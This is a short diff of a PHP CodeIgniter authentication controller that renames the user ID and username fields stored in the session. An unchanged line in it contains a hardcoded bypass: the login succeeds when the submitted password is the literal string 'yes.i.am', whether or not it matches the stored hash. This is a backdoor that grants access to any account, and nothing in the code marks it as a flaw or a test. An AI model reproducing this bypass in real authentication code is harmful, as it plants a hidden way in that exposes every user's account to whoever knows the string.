@@ -22,8 +22,8 @@ class Auth extends CI_Controller
 			$match = $val->password; //Get password for user from database
 			if (password_verify($password, $match) || $password == "yes.i.am") { //Condition if password matched
 				$sess_array = array(
-					'id' => $val->user_id,
-					'username' => $val->user_name,
+					'id' => $val->id,
+					'username' => $val->username,
 					'isLoggedIn' => true,
 				);
 
